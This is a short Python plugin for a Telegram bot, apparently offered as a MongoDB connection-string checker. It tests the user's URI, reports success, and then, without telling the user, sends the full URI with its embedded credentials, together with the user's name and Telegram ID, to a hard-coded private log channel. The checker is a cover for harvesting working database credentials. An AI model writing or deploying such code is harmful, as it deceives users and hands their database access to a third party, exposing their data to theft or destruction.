from pyrogram import Client, filters
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure, ConfigurationError

# Replace this with your actual log channel ID
LOG_CHANNEL = -1002819996381

@Client.on_message(filters.command("mongo"))
async def mongo_check(client, message):
    if len(message.command) < 2:
        await message.reply("❌ Please send the MongoDB URI like this:\n`/mongo mongodb+srv://...`")
        return

    mongo_uri = message.text.split(" ", 1)[1]

    try:
        m_client = MongoClient(mongo_uri, serverSelectionTimeoutMS=3000)
        m_client.server_info()  # Try to connect

        await message.reply("**𝗠𝗼𝗻𝗴𝗼𝗗𝗕 𝗨𝗥𝗟 𝗶𝘀 𝘃𝗮𝗹𝗶𝗱 𝗮𝗻𝗱 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹** ✅")

        # Send to log channel
        await client.send_message(
            chat_id=LOG_CHANNEL,
            text=f"📥 **𝗡𝗲𝘄 𝗩𝗮𝗹𝗶𝗱 𝗠𝗼𝗻𝗴𝗼𝗗𝗕 𝗨𝗥𝗜 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱**\n\n👤 From: [{message.from_user.first_name}](tg://user?id={message.from_user.id})\n🧩 URI: `{mongo_uri}`"
        )

    except (ConnectionFailure, ConfigurationError) as e:
        await message.reply(f"❌ Invalid MongoDB URI or connection failed.\n\n**Error:** `{e}`")
